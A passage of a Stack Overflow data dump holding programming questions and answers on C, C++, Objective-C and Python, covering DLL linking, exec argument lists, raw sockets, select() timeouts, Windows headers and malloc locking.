#define TESTLIB_EXPORT __declspec(dllimport)
#endif

TESTLIB_EXPORT void hello();
// ... more function declarations, marked with TESTLIB_EXPORT

#ifdef __cplusplus
}
#endif
</code></pre>

<p>To fix (3), copy the DLL into the same folder as your executable file.  The ""executable directories"" setting you're setting doesn't affect DLL searching -- see <a href=""http://msdn.microsoft.com/en-us/library/7d83bc18%28v=vs.80%29.aspx"">MSDN</a> for a detailed description of how DLLs are searched for.  The best solution for you is to copy your DLL into the directory where your executable file lives.  You can either do this manually, or add a post-build step to your project that does this for you.</p>
"
"<p>I want to write a template that returns me the smallest signed integer type that can represent a given number. This is my solution:</p>

<pre><code>/**
 * Helper for IntTypeThatFits.
 * Template parameters indicate whether the given number fits into 8, 16 or 32
 * bits. If neither of them is true, it is assumed that it fits 64 bits.
 */
template &lt;bool fits8, bool fits16, bool fits32&gt;
struct IntTypeThatFitsHelper { };

// specializations for picking the right type
// these are all valid combinations of the flags
template&lt;&gt; struct IntTypeThatFitsHelper&lt;true, true, true&gt; { typedef int8_t Result; };
template&lt;&gt; struct IntTypeThatFitsHelper&lt;false, true, true&gt; { typedef int16_t Result; };
template&lt;&gt; struct IntTypeThatFitsHelper&lt;false, false, true&gt; { typedef int32_t Result; };
template&lt;&gt; struct IntTypeThatFitsHelper&lt;false, false, false&gt; { typedef int64_t Result; };

/// Finds the smallest integer type that can represent the given number.
template &lt;int64_t n&gt;
struct IntTypeThatFits
{
    typedef typename IntTypeThatFitsHelper&lt;
        (n &lt;= numeric_limits&lt;int8_t&gt;::max()) &amp;&amp; (n &gt;= numeric_limits&lt;int8_t&gt;::min()), 
        (n &lt;= numeric_limits&lt;int16_t&gt;::max()) &amp;&amp; (n &gt;= numeric_limits&lt;int16_t&gt;::min()), 
        (n &lt;= numeric_limits&lt;int32_t&gt;::max()) &amp;&amp; (n &gt;= numeric_limits&lt;int32_t&gt;::min())
    &gt;::Result Result;
};
</code></pre>

<p>However, GCC does not accept this code. I get an error ""comparison is always true due to limited range of data type [-Werror=type-limits]"". Why does that happen? n is a signed 64bit integer, and all of the comparisons may be true or false for different values of n, or am I overlooking something?</p>

<p>I will be glad for any help.</p>

<p>Edit: I should mention that I am using C++11.</p>
","9530","","<p>The error is happening because you asked GCC to give you errors about this warning with <code>-Werror=type-limits</code>.  The warning <code>-Wtype-limits</code> gives you a warning if you ever do a comparison which will always be true due to the ranges of the given data types, for example:</p>

<pre><code>uint8_t x;
if(x &gt;= 0) { ... }  // always true, unsigned integers are non-negative
if(x &gt;= 256) { ... }  // always false

int32_t x;
if(x &lt; 9223372036854775808LL) { ... }  // always true
</code></pre>

<p>This warning can sometimes be useful, but in many cases including this it's just useless pedantry and can be ignored.  It's normally a warning (enabled as part of <code>-Wextra</code>, if you use that), but with <code>-Werror</code> or <code>-Werror=type-limits</code>, GCC makes it an error.</p>

<p>Since in this case it's not actually indicative of a potential problem with your code, just turn off the warning with <code>-Wno-type-limits</code>, or make it not be an error with <code>Werror=no-type-limits</code> if you don't mind seeing those warnings in the compiler output.</p>
"
"<p>I am trying to exec() a call to grep inside of my C program. I am looking for the number of occurrences of a string pattern in a given file, which can be achieved with:</p>

<pre><code>$ grep -e my_string -F my_file.txt -c
</code></pre>

<p>Which gives a number output as expected, such as:</p>

<pre><code>5
</code></pre>

<p>However, what I hoped would be equivalent seems to be having some difficulties. The following code:</p>

<pre><code>char *arg_list[] = {""-e"", ""my_string"", ""-F"", ""my_file.txt"", ""-c"", ""\0""};

int pid;
if ((pid = fork()) == 0) {
    if (execvp(""grep"", arg_list) &lt; 0)
        perror(""execvp"");
}
</code></pre>

<p>Results in:</p>

<pre><code> my_file.txt:5
 -e: : No such file or directory
</code></pre>

<p>There are two issues. First, I just want the number-- not the file in which it is found. Second, I'm not sure why it is trying to assert that the -e flag needs to be a file. If I switch around the argument list to be:</p>

<pre><code>char *arg_list[] = {""-F"", ""my_file.txt"", ""-e"", ""my_string"", ""-c"", ""\0""};
</code></pre>

<p>Then I get back:</p>

<pre><code>my_file.txt:5
-F: : No such file or directory
</code></pre>

<p>I'm not sure where to start looking for why this is happening. I'm also not sure why the output of the grep call from the command-line is just a number, but the exec()'d grep call outputs both the filename and number. </p>

<p>Any help would be appreciated! Thank you.</p>

<p>EDIT: </p>

<p>Solution: include the program name in the argument list, or simply use the system() call. Also, RTFM. </p>
","9530","","<p>You have two problems (insert JWZ quote about regular expressions here):</p>

<ol>
<li><p>The first argument in the array passed <code>exec</code> gets passed in as <code>argv[0]</code> to the new executable.  Ordinarily, this is the name of the executable, and it's what programs use to figure out their own name.  So you're telling grep that its name is <code>-e</code>, and its arguments are <code>my_string -F my_file.txt -c """"</code>.  It's not getting the <code>-e</code> argument like you might expect, so it misinterprets its arguments and gives you an error.</p></li>
<li><p>You're not properly NULL-terminating the array of arguments to <code>exec</code>.  The last argument must be a literal <code>NULL</code>, not a string <code>""\0""</code>.  That string is an empty string, but it's not a null pointer.</p></li>
</ol>
"
"<p>When I have something like this:</p>

<pre><code>class A
{
  virtual void rat();
};

class B : public A
{
  virtual void rat() { ; } //implemented!
};

int main(int argc, char **argv)
{
  A *a = new B;
  delete a;
}
</code></pre>

<p>I get linker errors:</p>

<p>unless I make the base rat a pure virtual.</p>

<p>However, when I have this:</p>

<pre><code>class A
{
  public:
  void rat();
};

int main(int argc, char **argv)
{
  A a;
}
</code></pre>

<p>This compiles fine and doesn't give me an undefined reference link error unless I explicitly try to call the rat function in my main (<code>a.rat();</code>). What is the rule on unimplemented base class virtual functions which are, however, implemented in a derived class as in the first failing code snippet?</p>
","9530","","<p>Because the C++ standard requires it to be implemented.  From C++03 §10.3/8:</p>

<blockquote>
  <p>A virtual function declared in a class shall be defined, or declared pure (10.4) in that class, or both; but no diagnostic is required (3.2).</p>
</blockquote>

<p>So you need to either declare it pure (with the <code>= 0</code> suffix after the right parenthesis) or define its implementation.</p>

<p>As for why you don't get an error when you don't call the function in the non-virtual case, refer to C++03 §3.2/2-3 (emphasis mine)</p>

<blockquote>
  <p>2) An expression is <em>potentially evaluated</em> unless it appears where an integral constant expression is required
  (see 5.19), is the operand of the <code>sizeof</code> operator (5.3.3), or is the operand of the <code>typeid</code> operator and
  the expression does not designate an lvalue of polymorphic class type (5.2.8). An object or non-overloaded
  function is <em>used</em> if its name appears in a potentially-evaluated expression. <strong>A virtual member function is
  used if it is not pure.</strong> [...]</p>
  
  <p>3) Every program shall contain <strong>exactly one definition of every non-inline function or object that is used</strong> in that
  program; no diagnostic required. The definition can appear explicitly in the program, it can be found in the
  standard or a user-defined library, or (when appropriate) it is implicitly defined (see 12.1, 12.4 and 12.8).
  An inline function shall be defined in every translation unit in which it is used.</p>
</blockquote>

<p>So, in the non-virtual case, if it's not used, a definition is not required.  But in the non-pure virtual case, even if it's not explicitly referenced in code, it's still considered to be used by the standard, so its definition is required.</p>

<p>See also <a href=""http://stackoverflow.com/questions/4145915/a-virtual-member-function-is-used-if-it-is-not-pure"">A virtual member function is used if it is not pure?</a>.</p>
"
"<p>Is there any easy way to convert an Objective-C holding class of NSStrings into parameters for a function accepting a variable list of char *? Specifically I have a function like:</p>

<blockquote>
  <p>-(void)someFunction:(NSSomething *) var</p>
</blockquote>

<p>that I want to forward to a C function like</p>

<blockquote>
  <p>void someCFunction(char * var, ...)</p>
</blockquote>

<p>Is there an easy way to go about this?</p>
","9530","","<p>No, you can only do what you want if the number of arguments you're passing is known at compile time.  If you just want to convert a single string, use the <a href=""https://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/NSString_Class/Reference/NSString.html#//apple_ref/occ/instm/NSString/UTF8String"" rel=""nofollow""><code>-UTF8String</code> message</a>:</p>

<pre><code>// Example with two strings
NSString *str1 = ...;
NSString *str2 = ...;
someCFunction([str1 UTF8String], [str2 UTF8String]);  // etc.
</code></pre>

<p>But if the number of strings will vary at runtime, you'll need to use a different API, if one is available.  For example, if there's an API that took an array of strings, you could convert the Objective-C array into a C array:</p>

<pre><code>// This function takes a variable number of strings.  Note: in C/Objective-C
// (but not in C++/Objective-C++), it's not legal to convert 'char **' to
// 'char *const *', so you may sometimes need a cast to call this function
void someCFunction(const char *const *stringArray, int numStrings)
{
    ...
}

...

// Convert Objective-C array to C array
NSArray *objCArray = ...;

int numStrings = [objCArray count];
char **cStrArray = malloc(numStrings * sizeof(char*));
for (int i = 0; i &lt; count; i++)
    cStrArray[i] = [[objCArray objectAtIndex:i] UTF8String];

// Call the function; see comment above for note on cast
someCFunction((const char *const *)cStrArray, numStrings);

// Don't leak memory
free(cStrArray);
</code></pre>
"
"<p>I am thinking if it is possible to redirect printf or cout to a socket easily?</p>

<p>I am currently programming in Windows VC++ btw...</p>
","9530","","<p>No, but you can use the <code>sprintf</code> family of functions:</p>

<pre><code>// Make sure this buffer is big enough; if the maximum size isn't known, use
// _vscprintf or a dynamically allocated buffer if you want to avoid truncation
char buffer[2048];
_snprintf_s(buffer, sizeof(buffer), _TRUNCATE, ""format %s etc."", args...);
send(mySocket, buffer, strlen(buffer)+1, 0);  // +1 for NUL terminator
</code></pre>

<p>Note that <code>_snprintf_s</code> is a Microsoft runtime-only function, so if you're writing portable code, use <code>snprintf</code> instead on other platforms.</p>

<p>In C++, you can also use a <code>std::ostringstream</code> for similar results:</p>

<pre><code>std::ostringstream buffer;
buffer &lt;&lt; ""test: "" &lt;&lt; myvar &lt;&lt; somethingelse &lt;&lt; etc;
send(mySocket, buffer.str().c_str(), buffer.str().size() + 1, 0);
                                                     // +1 for NUL terminator
</code></pre>
"
"<p>Learning the hard way, I tried to left shift a <code>long long</code> and <code>uint64_t</code> to more than 32 bits on an x86 machine resulted <code>0</code>. I vaguely remember to have read somewhere than on a 32 bit machine shift operators only work on the first 32 bits but cannot recollect the source.
I would like to know is if Shifting more than 32 bits of a uint64_t integer on an x86 machine is an Undefined Behavior?</p>
","9530","","<p><a href=""http://stackoverflow.com/a/10499371/9530"">Daniel Fischer's answer</a> answers the question about the C language specification.  As for what actually happens on an x86 machine when you issue a shift by a variable amount, refer to the <a href=""http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html"" rel=""nofollow"">Intel Software Developer Manual</a> Volume 2B, p. 4-506:</p>

<blockquote>
  <p>The count is masked to 5 bits (or 6 bits
  if in 64-bit mode and REX.W is used). The count range is limited to 0 to 31 (or 63 if
  64-bit mode and REX.W is used).</p>
</blockquote>

<p>So if you attempt to shift by an amount larger than 31 or 63 (for 32- and 64-bit values respectively), the hardware will only use the bottom 5 or 6 bits of the shift amount.  So this code:</p>

<pre><code>uint32_t RightShift(uint32_t value, uint32_t count)
{
    return value &gt;&gt; count;
}
</code></pre>

<p>Will result in <code>RightShift(2, 33) == 1</code> on x86 and x86-64.  It's still <strong>undefined behavior</strong> according to the C standard, but on x86, if the compiler compiles it down to a <code>sar</code> instruction, it will have defined behavior on that architecture.  But you should still avoid writing this sort of code that depends on architecture-specific quirks.</p>
"
"<p>So, the declaration of <code>GetSystemTimes</code> in <code>winbase.h</code> (on my machine, Windows 7 VS2005)</p>

<pre><code>#if _WIN32_WINNT &gt;= 0x0501

BOOL
WINAPI
GetSystemTimes(
    __out_opt LPFILETIME lpIdleTime,
    __out_opt LPFILETIME lpKernelTime,
    __out_opt LPFILETIME lpUserTime
    );

#endif
</code></pre>

<p>Sure, I can just <code>#define _WIN32_WINNT 0x0501</code>, but that just doesn't seem right and I can't find an explanation of why this is the case and what my alternatives are.  Anyone have some insight here?</p>
","9530","","<p>It's <code>#if</code>ed out because it wasn't added to the API until Windows NT v5.01, AKA Windows XP.  Your program is expected to <code>#define</code> the symbol <code>_WIN32_WINNT</code> to the hex value of your minimum targeted Windows version: see <a href=""http://msdn.microsoft.com/en-us/library/aa383745%28v=vs.85%29.aspx"">Using the Windows Headers</a>.</p>

<p>If you don't define <code>_WIN32_WINNT</code>, it assumes you're targeting the lowest common denominator, and it doesn't provide newer API features.  So if you want to use them, you need to define <code>_WIN32_WINNT</code> to an appropriate value and understand that your code won't run on older versions of Windows, which is usually fine -- nobody's going to complain that your code doesn't run on Windows 98.</p>
"
"<p>I am reading bytes from a serial port in C++ using a file descriptor and the posix/unix read() function. In this example, I am reading 1 byte from the serial port (baud rate settings and similiar are omitted for clarity):</p>

<pre><code>#include &lt;termios.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;

int main(void)
{
   int fd = open(""/dev/ttyS0"", O_RDWR | O_NOCTTY);
   char buf[1];
   int bytesRead = read(fd, buf, 1);
   close(fd);
   return 0;
}
</code></pre>

<p>If the device connected to /dev/ttyS0 does not send any information, the program will hang. How can I set a timeout?</p>

<p>I have tried setting a time out like this:</p>

<pre><code>struct termios options;
tcgetattr(fd, &amp;options);
options.c_cc[VMIN] = 0;
options.c_cc[VTIME] = 10;
tcsetattr(fd, TCSANOW, &amp;options);
</code></pre>

<p>I thought it was supposed to give 1 second timeout, but it makes no difference. I think I have misunderstood VMIN and VTIME. What is VMIN and VTIME used for?</p>

<p>Then I searched the web and found somebody talking about the select() function. Is that the solution and if so, how would one apply that to the program above to make 1 second timeout?</p>

<p>Any help is appreciated. Thanks in advance :-)</p>
","9530","","<p>Yes, use <a href=""http://linux.die.net/man/2/select""><code>select(2)</code></a>.  Pass in a file descriptor set containing just your fd in the read set and empty write/exception sets, and pass in an appropriate timeout.  For example:</p>

<pre><code>int fd = open(...);

// Initialize file descriptor sets
fd_set read_fds, write_fds, except_fds;
FD_ZERO(&amp;read_fds);
FD_ZERO(&amp;write_fds);
FD_ZERO(&amp;except_fds);
FD_SET(fd, &amp;read_fds);

// Set timeout to 1.0 seconds
struct timeval timeout;
timeout.tv_sec = 1;
timeout.tv_usec = 0;

// Wait for input to become ready or until the time out; the first parameter is
// 1 more than the largest file descriptor in any of the sets
if (select(fd + 1, &amp;read_fds, &amp;write_fds, &amp;except_fds, &amp;timeout) == 1)
{
    // fd is ready for reading
}
else
{
    // timeout or error
}
</code></pre>
"
"<p>When I try to debug a code in Visual C++ 2010, in the Output box, there's some notification :</p>

<blockquote>
  <p>'latihan.exe': Loaded 'C:\Users\sinta\Documents\Visual Studio 2010\Projects\latihan\Debug\latihan.exe', Symbols loaded.<br>
  'latihan.exe': Loaded 'C:\Windows\System32\ntdll.dll', Cannot find or open the PDB file<br>
  'latihan.exe': Loaded 'C:\Windows\System32\kernel32.dll', Cannot find or open the PDB file<br>
  'latihan.exe': Loaded 'C:\Windows\System32\KernelBase.dll', Cannot find or open the PDB file<br>
  'latihan.exe': Loaded 'C:\Windows\System32\mpich2mpi.dll', Cannot find or open the PDB file
  'latihan.exe': Loaded 'C:\Windows\System32\msvcr100d.dll', Symbols loaded.<br>
  The program '[1008] latihan.exe: Native' has exited with code 0 (0x0).</p>
</blockquote>

<p>The code :  </p>

<pre><code>#include &lt;stdio.h&gt;

int main ()
{
    printf (""Welcome \n"");
    return 0;
}
</code></pre>

<p>I just want to know, :)</p>
","9530","","<p>Those messages mean that your system is missing the symbol files (.pdb, for <em>program database</em>) for various Windows DLLs.  They're pretty harmless messages, since usually you won't really care about them, but if you want to get the symbols, you can obtain them via <a href=""http://support.microsoft.com/kb/311503"" rel=""nofollow"">Microsoft's symbol servers</a>.</p>
"
"<p>I have a C lib and dll file from windows application. No source code with me.
Is it possible to use that in an IOS application.</p>

<p>I have seen mixed responses and am confused. 
If we have source code , i think we need to create dylib and then we can use the same after including relevant header file.</p>

<p>Please share any expert ideas to guide me in right direction.
Appreciate your help .</p>

<ul>
<li>mia </li>
</ul>
","9530","","<p>No.  If you all you have is a compiled binary DLL, there is no way to use it on iOS.  Unless you happen to have an ARM DLL for the upcoming Windows 8, your DLL contains either x86 or x86-64 machine code (or maybe IA64 if you have a lot of money), which absolutely will not run on iOS devices, which are all ARM architectures.  Plus many more reasons.</p>

<p>If you have the source code, you can recompile it for iOS, either directly into your app, as a static library that can be linked in with your app, or as a dynamic library as part of a framework.  But in all cases, you need to recompile it from source code using the iOS compiler.</p>
"
"<p>Can I append to a list in a dictionary? </p>

<pre><code>test = {'food' : 'apple'}
</code></pre>

<p>Is there a command to add <code>'banana'</code> and turn it into </p>

<pre><code>test = { 'food': ['apple','banana'] }
</code></pre>

<p>Thank you</p>
","9530","","<p>I'd recommend using a <a href=""http://docs.python.org/library/collections.html#collections.defaultdict"" rel=""nofollow""><code>defaultdict</code></a> in this case, it's pretty straightforward to deal with dictionaries of lists, since then you don't need two separate cases every time you modify an entry:</p>

<pre><code>import collections

test = collections.defaultdict(list)

test['food'].append('apple')
test['food'].append('banana')

print test
# defaultdict(&lt;type 'list'&gt;, {'food': ['apple', 'banana']})
</code></pre>
"
"<pre><code>   char *pStrBuffer;

   unsigned char data;
   unsigned int Address;

   /* pStrBuffer reading from a file data in file of the form 
     WriteByte(0xDE04,0x20)
     WriteByte(0xFE08,0x50) ....

    */
   /* in a loop */
   sscanf(pStrBuffer,""%x%x"",&amp;Address,&amp;data);
</code></pre>

<p>Compiler is gnu gcc 4.5 in Windows XP
However the Value read for Address is 0xDE00 instead of 0xDE04 ? why is that so although value of data is read correctly.
 I also tried to use %lx and %hx respectively but of no use</p>
","9530","","<p>To read a single unsigned byte, use the <code>%hhx</code> modifier.  <code>%hx</code> is for an <code>unsigned short</code>, <code>%x</code> is for an <code>unsigned int</code>, <code>%lx</code> is for an <code>unsigned long</code>, and <code>%llx</code> is for an `unsigned long long.</p>
"
"<p>I was wondering how I would go about reversing the capitalization of the characters in an NSString or NSMutableString, ignoring non-letter characters.  For example, ""HeLLO jIM66"" would become ""hEllo Jim66"".  </p>

<p>I know about uppercaseString, lowercaseString and capitalizedString but I haven't been able to figure out how to REVERSE the capitalization of ALL the letters in the string.</p>

<p>Thanks for your help!</p>
","9530","","<p>Just iterate through all of the characters in the string.  If a character is uppercase, replace it with a lowercase letter; if it's lowercase, replace it with an uppercase letter; otherwise, leave it alone.  For example:</p>

<pre><code>+ (NSString *) reverseCase:(NSString *)str
{
    int length = [str length];
    NSMutableString *result = [NSMutableString stringWithCapacity:length];

    for (int i = 0; i &lt; length; i++)
    {
        unichar ch = [str characterAtIndex:i];
        if (islower(ch))
            ch = toupper(ch);
        else if (isupper(ch))
            ch = tolower(ch);
        [result appendString:[NSString stringWithCharacters:&amp;ch length:1]];
    }

    return result;
}
</code></pre>
"
"<p>Please help.
On Visual Studio 2008, I'm getting the following errors.</p>

<pre><code>============================================================

   1&gt;Microsoft (R) Windows Resource To Object Converter Version 9.00.30729.01
   1&gt;Copyright (C) Microsoft Corporation.  All rights reserved.
   1&gt;adding resource. type:ICON, name:1, language:0x0409, flags:0x1010, size:744
   1&gt;adding resource. type:ICON, name:2, language:0x0409, flags:0x1010, size:296
   1&gt;adding resource. type:GROUP_ICON, name:128, language:0x0409, flags:0x1030, size:34
   1&gt;adding resource. type:DIALOG, name:100, language:0x0409, flags:0x1030, size:374
   1&gt;adding resource. type:DIALOG, name:102, language:0x0409, flags:0x1030, size:784
   1&gt;adding resource. type:VERSION, name:1, language:0x0409, flags:0x30, size:928
   1&gt;adding resource. type:STRING, name:7, language:0x0409, flags:0x1030, size:68

   1&gt;LINK : error LNK2001: unresolved external symbol _WinMainCRTStartup

   1&gt;.\Release/DiskTest.exe : fatal error LNK1120: 1 unresolved externals

   1&gt;Build log was saved at ""file://c:\WinIRDir\Utilities\DiskTest\Release\BuildLog.htm""
   1&gt;DiskTest - 2 error(s), 0 warning(s)
   1&gt;Build log was saved at ""file://c:\WinIRDir\Utilities\CommApp\Release\BuildLog.htm""
==============================================================
</code></pre>

<p>Here is the situation.
- DiskTest.exe is one of 3 projects in my solution
- This project builds perfectly for Debug x64, Release x64, and Debug Win32.  Release Win32 is the only one generating these errors.
- I have spend hours comparing the properties pages for all 4 config/machine combinations, and am confident that no properties are missing from one version to the next.  I paid special attention to  ""Additional dependencies"", ""Additional Librari Directories"", ""Input"", etc.  Ofcourse, paths to .lib files point to either \Debug or \Release, and \x86 or \x64 for the respective config or platform.</p>

<p>The only ""additional dependency"" this project has is SBF_Util.lib and SBF_Utild.lib for Debug.  I made sure that all 4 versions (debug win32 and x64, and Release win32 and x64) of this library exist in the folder specified in each ""additional library directory""  I also checked dumpbin on each version of the library to make sure the platform matches.</p>

<p>I have seen other situations where a main entry point is missing, but in this case, all other versions build with no problems, it is only on Win32 Relase version that generates this error, so I don't think I need to change anything in the code.  </p>

<p>Can anybody provide any clues?, I'm out of ideas.  Any ideas will be very much appreciated.  Thanks.</p>
","9530","","<p>Open up your project's settings page, go to <strong>Linker</strong> → <strong>System</strong> and examine the <strong>SubSystem</strong> property.  Make sure it's set to the same value in all project configurations by switching the configuration from the configuration drop-down box.</p>

<p>Assuming that your intended entry point is <code>main</code> (or one of its variants such as <code>_tmain</code> or <code>wmain</code>), you want to make sure to use the SubSystem property is set to <strong>CONSOLE</strong>.</p>
"
"<p>I'm using Apple's llvm-gcc to compile some code with inline assembly. I wrote what I want it to do, but it adds extraneous commands that keep writing variables to memory. Why is it doing this and how can I stop it?</p>

<p>Example:</p>

<pre><code>__asm__{
  mov r11, [rax]
  and r11, 0xff
  cmp r11, '\0'
}
</code></pre>

<p>becomes (in the ""assembly"" assistant view):</p>

<pre><code>mov  0(%rax), %r11     // correct
movq %r11, -104(%rbp)  // no, GCC, obviously wrong
and  $255, %r11
movq %r11, -104(%rbp)
cmp  $0, %r11
</code></pre>

<p>Cheers.</p>
","9530","","<p>You need to use GCC's <a href=""http://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html#s5"" rel=""nofollow"">extended asm syntax</a> to tell it which registers you're using as input and output and which registers get clobbered.  If you don't do that, it has no idea what you're doing, and the assembly it generates can easily interfere with your code.</p>

<p>By informing it about what your code is doing, it changes how it does register allocation and optimization and avoids breaking your code.</p>
"
"<p>I am using openssl, and I get lots and lots of warnings during build about missing <strong>libeay.pdb</strong>. Can somebody suggest how to add it ? <br></p>

<p><br>the build.cmd looks like this (significant piece I think):<br></p>

<pre><code>...
perl util\mk1mf.pl debug dll no-asm VC-WIN64A &gt;ms\ntdll64.dbg.mak
perl util\mkdef.pl 32 libeay &gt; ms\libeay32.def
nmake -f ms/nt64.dbg.mak
</code></pre>

<p>I read the INSTALL.W32 which says ""If you use the platform debug-VC-WIN32 instead of VC-WIN32 then debugging symbols will be compiled in."" I Tried to replace VC-WIN64A with debug-WIN64A (same with 32), and the build gave me an error </p>

<pre><code>Unknown option --debug-VC-WIN64A
</code></pre>

<p>Thank you.</p>

<p>Edit: It worked when I added /DEBUG after mak<br>
Edit again: /DEBUG was not necessary, the <b>debug</b> word in the command did the work.<br>How do I build it with Visual Studio ?</p>
","9530","","<p>When you build OpenSSL on Windows with Visual Studio, the symbols file for the library is named <code>lib.pdb</code>, and it's located in the <code>tmp32</code> directory, so you might need to manually copy it into the <code>out32</code> directory.</p>

<p>This was true for the Win32 configuration as of version 1.0.0g; it's possible that that's changed since then, and it's possible it might be different for Win64.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/3648411/objective-c-parse-hex-string-to-integer"">Objective C parse hex string to integer</a>  </p>
</blockquote>



<p>I need the integer value of a NSString representing hex number. For example how do I get the int value (10) of the NSString @""A""?</p>
","9530","","<p>You can use the <code>sscanf</code> with the <code>%</code> format specifier to parse it as a hexadecimal integer:</p>

<pre><code>NSString *str = @""A"";
...
int value;
if (sscanf([str UTF8String], ""%x"", &amp;value) == 1)
{
    // Parsing succeeded
}
else
{
    // Parsing failed, handle error
}
</code></pre>
"
"<p>I am building a network utility for OS X. I've gone through Apples documentation, but I cannot find the framework that allows my app to monitor incoming bytes. Can anybody point me in the right direction? Thank you for your time!</p>
","9530","","<p>You can use <a href=""http://www.tcpdump.org/pcap3_man.html"" rel=""nofollow"">libpcap</a>, which is a portable library for doing packet captures used by tcpdump, Wireshark, and more.  It's not an official Apple library, but it's BSD-licensed so you shouldn't have any problem using it.</p>
"
"<p>I am trying to send across a character array using a transmitter and a receiver program using raw sockets.  I am able to get the correct number of bytes sent at the receiver side, but the values printed out are garbage. Could someone help me out here?</p>

<p>Transmitter: </p>

<pre><code>int create_raw_socket(char *dev) 
{   
struct sockaddr_ll sll;
struct ifreq ifr;
int fd, ifi, rb;

bzero(&amp;sll, sizeof(sll)); 
    bzero(&amp;ifr, sizeof(ifr));

fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

assert(fd != -1);

strncpy((char *)ifr.ifr_name, dev, IFNAMSIZ);
ifi = ioctl(fd, SIOCGIFINDEX, &amp;ifr);
assert(ifi != -1);
sll.sll_protocol = htons(ETH_P_ALL);
sll.sll_family = AF_PACKET;
sll.sll_ifindex = ifr.ifr_ifindex;
rb = bind(fd, (struct sockaddr *)&amp;sll,sizeof(sll));
assert(rb != -1);

return fd;  
 }


int SendPacket(char *dev ,unsigned char *send_packet, int packet_len) 
{
   int num_sent= 0;
   int sockaddress = create_raw_socket(dev);

   if((num_sent = write(sockaddress, &amp;send_packet, packet_len)) != packet_len)
     { 

         close(sockaddress);
          return 0;
     } 
   else
     { 
        close(sockaddress);
         return 1; 
     }

  }


int main(int argc, char**argv)
{
   int x,fd,s; 

    char *send_packet=""HELLO"";

   int len = sizeof(send_packet);

   while(1)
   {

   if(!SendPacket((argv[1]), send_packet, len))
     perror(""Error sending packet"");
   else
     printf(""Packet sent successfully with payload : %s\n"" ,send_packet);
   }
    return 0; 
 }
</code></pre>

<p>Receiver :</p>

<pre><code>int main(int argc, char **argv)
{
 struct sockaddr addr;
 int sock_fd, fromlen,s;
 char buf[PACKET_LENGTH];
 char *dev = argv[1];


 while(1)
 {

   fromlen=sizeof(addr);
   sock_fd = create_raw_socket(dev);   /* Creating the raw socket */
   int x= recvfrom(sock_fd,&amp;buf,sizeof(buf),0,&amp;addr,&amp;fromlen);
   printf(""\n Number of bytes of data received is %d \n"",x);

   printf(""\nPayload  Received from client... is %s \n"", buf);

   close(sock_fd);

 }
 return 0;
 }
</code></pre>
","9530","","<p>You have several problems:</p>

<ol>
<li><p>This line</p>

<pre><code>if((num_sent = write(sockaddress, &amp;send_packet, packet_len)) != packet_len)
</code></pre>

<p>Should say just <code>send_packet</code> instead of <code>&amp;send_packet</code>.  <code>send_packet</code> is a pointer that points to the desired packet data, so there's no need to take its address -- you don't want to write out the literal address of that pointer into the packet, that just simply won't work.</p></li>
<li><p>This is wrong:</p>

<pre><code>char *send_packet=""HELLO"";
int len = sizeof(send_packet);
</code></pre>

<p><code>sizeof(send_packet)</code> will always be the size of a pointer on your system, typically either 4 or 8 bytes.  You really want to either declare <code>send_packet</code> as an array type (e.g. <code>char send_packet[] = ...</code>), or use <code>strlen</code> to compute its length at runtime (e.g. <code>int len = strlen(send_packet) + 1;</code>).  In your case, you're either sending too little data (4 bytes) or too much data (8 bytes), both of which are problematic.</p></li>
<li><p>Your <code>printf</code> code in the client assumes that the data it receives is null-terminated, which it is not necessarily.  You should either manually null-terminate the data before printing it (or using any other string functions, for that matter), or tell <code>printf</code> the limit of how much data to print.  I'd suggest null-terminating it like so:</p>

<pre><code>char buf[PACKET_LENGTH + 1];  // +1 for null terminator
int x = recvfrom(sock_fd,buf,PACKET_LENGTH,0,&amp;addr,&amp;fromlen);
if(x &gt;= 0)
    buf[x] = 0;
</code></pre></li>
<li><p>Your code has poor <code>const</code> correctness.  <code>SendPacket</code> should take a <code>const char*</code> instead of <code>char*</code> parameter, and <code>send_packet</code> should either be declared as <code>char[]</code> or as <code>const char*</code>.  The conversion from string literals to <code>char*</code> is deprecated and should be avoided in all new C code.</p></li>
</ol>
"
"<p>Does the typical <code>malloc</code> (for x86-64 platform and Linux OS) naively lock a mutex at the beginning and release it when done, or does it lock a mutex in a more clever way at a finer level, so that lock contention is reduced? If it indeed does it the second way, how does it do it?</p>
","9530","","<p><a href=""http://g.oswego.edu/dl/html/malloc.html"">Doug Lea's <code>malloc</code></a> used coarse locking (or no locking, depending on the configuration settings), where every call to <code>malloc</code>/<code>realloc</code>/<code>free</code> is protected by a global mutex.  This is safe but can be inefficient in highly multithreaded environments.</p>

<p><a href=""http://www.malloc.de/en/index.html""><code>ptmalloc3</code></a>, which is the default <code>malloc</code> implementation in the GNU C library (libc) used on most Linux systems these days, has a more fine-grained strategy, as described in <a href=""http://stackoverflow.com/a/10706725/9530"">aix's answer</a>, which allows multiple threads to concurrently allocate memory safely.</p>

<p><a href=""http://www.nedprod.com/programs/portable/nedmalloc/""><code>nedmalloc</code></a> is another independent implementation which claims even better multithreaded performance than <code>ptmalloc3</code> and various other allocators.  I don't know how it works, and there doesn't seem to be any obvious documentation, so you'll have to check the source code to see how it works.</p>
"
"<p>Can a program detect if it's stdin is
coming from keyboard input vs. being
redirected from a file? in c ?</p>
","9530","","<p>Yes, on most systems.  On POSIX systems (Linux, Mac OS X, BSD, plus many more), you can use the <a href=""http://linux.die.net/man/3/isatty""><code>isatty(3)</code></a> function on file descriptor 0 (standard input).  On Windows, you can use <a href=""http://msdn.microsoft.com/en-us/library/f4s0ddew%28v=vs.80%29.aspx""><code>_isatty</code></a>.  For example:</p>

<pre><code>if(isatty(0))
{
    // standard input is a terminal device
}
</code></pre>

<p>Note that many programs use <code>isatty</code> to alter their output buffering behavior: if standard output is a terminal, the output is line buffered (e.g. it's flushed after every newline gets printed), whereas if standard output is not a terminal, it's fully-buffered (e.g. it's flushed only when the buffer becomes full, the process exits normally, or the stream is explicitly flushed by the application).</p>
"
"<p>I am updating a C++ program written twenty years ago to run scientific experiments that involve the precise starting and stopping of sounds. The program also needs to be able to control playback volume, pause sounds or start them at a designated position, loop sounds a specified number of times, and control channel mapping.</p>

